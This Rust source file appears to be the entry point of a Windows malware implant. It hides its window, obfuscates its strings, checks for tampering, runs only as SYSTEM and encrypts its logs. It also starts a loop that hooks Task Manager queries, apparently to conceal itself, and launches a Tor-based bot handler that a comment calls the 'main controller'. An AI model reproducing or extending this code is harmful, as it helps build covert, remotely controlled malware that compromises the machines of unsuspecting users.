#![windows_subsystem = "windows"]

use std::sync::Mutex;
use client_vars::constants::log_directory;
use network::tor::BotHandler;
use obfstr::obfstr as s;
use shared::{
    constants::logs_encryption_key,
    logs::logger::Logger,
    network::tor::LoggerConfig,
    uac::checks::is_system,
    utils::{ anti_tampering::is_clean, config::load_mib_config, functions::exit_1 },
};
use lazy_static::lazy_static;
use tasks::task_manager_hook::run_query_hooker;

mod tasks;
mod utils;
mod network;

lazy_static! {
    pub static ref LOGGER: Mutex<Option<Logger>> = Mutex::new(None);
}

#[macro_export]
macro_rules! log_internal {
    ($level:expr, $s:expr) => {
        {
        match &*$crate::LOGGER.lock().unwrap() {
            Some(logger) => {
                logger.log($level, s!($s));
                // println!("{:#?}",$s);
            }
            None => {}
        }
        }
    };

    (
        $level:expr,
        $fmt:expr,
        $($arg:tt)*
    ) => {
        {
            match &*$crate::LOGGER.lock().unwrap() {
                Some(logger) => {
                logger.log($level, &format!("{}{:#?}", s!($fmt), $($arg)*));
                // println!("{}{:#?}", $fmt, $($arg)*);
            }
            None => {}
        }
        }
    };
}
#[macro_export]
macro_rules! info {
    ($s:expr) => {
        crate::log_internal!(s!("INFO"), $s)
    };
    (
        $fmt:expr,
        $($arg:tt)*
    ) => {
        $crate::log_internal!(s!("INFO"), $fmt, $($arg)*)
    };
}
#[macro_export]
macro_rules! warn {
    ($s:expr) => {
        $crate::log_internal!(s!("WARN"), $s)
    };
    (
        $fmt:expr,
        $($arg:tt)*
    ) => {
        $crate::log_internal!(s!("WARN"), $fmt, $($arg)*)
    };
}
#[macro_export]
macro_rules! err {
    ($s:expr) => {
        $crate::log_internal!(s!("ERROR"), $s)
    };
    (
        $fmt:expr,
        $($arg:tt)*
    ) => {
           $crate::log_internal!(s!("ERROR"), $fmt, $($arg)*
        )
    };
}
#[macro_export]
macro_rules! verbose {
    ($s:expr) => {
        $crate::log_internal!(s!("VERBOSE"), $s)
    };
    (
        $fmt:expr,
        $($arg:tt)*
    ) => {
        $crate::log_internal!(s!("VERBOSE"), $fmt, $($arg)*)
    };
}
#[macro_export]
macro_rules! tag {
    ($s:expr) => {
        $crate::log_internal!(s!("TAG"), $s)
    };
}

#[tokio::main]
async fn main() {
    // first off - we should only be ran by service - as system
    if !is_clean() {
        exit_1();
    }
    if !is_system().unwrap_or(false) {
        exit_1();
    }

    let mib_config = load_mib_config(false);

    if !mib_config.clean_up_done {
        exit_1();
    }

    let res_logger = Logger::new(log_directory(), logs_encryption_key());
    if let Ok(logger) = res_logger {
        let mut lock = LOGGER.lock().unwrap();
        *lock = Some(logger);
    }

    info!("Init");

    tokio::task::spawn(async move {
        loop {
            if let Err(error) = run_query_hooker().await {
                err!("run_query_hooker errored out: ", error);
            };
        }
    });
    let config = LoggerConfig::Existing(LOGGER.lock().unwrap().clone());
    if let Ok(mut bot_handler) = BotHandler::new(config).await {
        bot_handler.run_handler().await;
    };
}

// system info - a struct - where its loaded
// it will be included in bot handler which is the main controller the main boogeyman thing
